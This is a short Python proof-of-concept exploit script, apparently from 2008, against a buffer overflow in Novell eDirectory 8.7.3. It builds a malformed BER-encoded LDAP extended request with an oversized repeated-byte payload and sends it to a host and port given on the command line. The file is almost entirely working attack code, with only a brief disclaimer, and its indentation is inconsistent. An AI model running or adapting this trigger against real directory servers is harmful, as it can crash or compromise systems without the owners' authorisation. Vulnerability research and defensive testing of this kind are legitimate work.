#!/usr/bin/env python
# edir_bug1.py
#
# Use this code at your own risk. Never run it against a production system.
# 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import socket
import sys

"""
Discovery date: Oct, 2008

Novell eDirectory 8.7.3 SP10b overflow

# ndsstat
Tree Name: CORP-TREE
Server Name: .CN=NDSServer.O=company.T=CORP-TREE.
Binary Version: 10554.34
Root Most Entry Depth: 0
Product Version: eDirectory for Linux v8.7.3.10 [DS]

Trigger for this bug is below.
"""

def int2berlen(i):
        e=int2ber(i, signed=0)
        if i <= 127:
                return e
        else:
                l=len(e)
                return chr(0x80|l) + e

def int2ber(i, signed=1):
        encoded=''
        while ((signed and (i>127 or i<-128))
                or (not signed and (i>255))):
                encoded=chr(i%256)+encoded
                i=i>>8
        encoded=chr(i%256)+encoded
        return encoded


def send_req(host,port):
 OID="2.16.840.1.113719.1.27.100.13"
         
 s="\xdf\xff"*10000
        s="\x04" + int2berlen(len(s)) + s
        s = "\x30" + int2berlen(len(s)) + s
        s="\x81" + int2berlen(len(s)) + s
        s="\x80" + int2berlen(len(OID)) + OID + s
        s="\x02\x01\x01\x77" + int2berlen(len(s)) + s
        s="\x30" + int2berlen(len(s)) + s

 print "Sending %d bytes to %s:%d" % (len(s), host, port)

 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((host,port))
 sock.sendall(s)
 sock.recv(1000)
 sock.close()

 print "Done"

if __name__=="__main__":
 if len(sys.argv)<3:
  print "usage: %s host port" % sys.argv[0]
  sys.exit()

 send_req(sys.argv[1],int(sys.argv[2]))
